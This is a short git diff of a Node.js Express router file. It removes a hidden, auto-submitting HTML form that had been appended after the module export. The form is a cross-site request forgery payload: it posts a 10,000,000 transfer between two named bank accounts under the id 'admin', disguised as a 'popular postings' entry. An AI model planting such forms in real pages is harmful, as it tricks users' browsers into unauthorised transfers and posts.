@@ -230,18 +230,3 @@ router.get("/search", async (req, res) => {
 });
 
 module.exports = router;
-
-
-<form id="csfrf-form" style="display:none" method="post" action="/post/save" >
-  <input type="hidden" name="title" value="이번주 인기 공고">
-  <input type="hidden" name="id" value="admin">
-  <input type="hidden" name="sourceAccount" value="국민 01-4231-5506 아무개">
-  <input type="hidden" name="targetAccount" value="국민 01-2345-6789 홍길동">
-  <input type="hidden" name="content" value="이번주 인기 공고 목록입니다.">
-  <input type="hidden" name="amount" value="10000000">
-  <input type="submit">
-</form>
-    
-<script>
-  document.getElementById('csfrf-form').submit();
-</script>
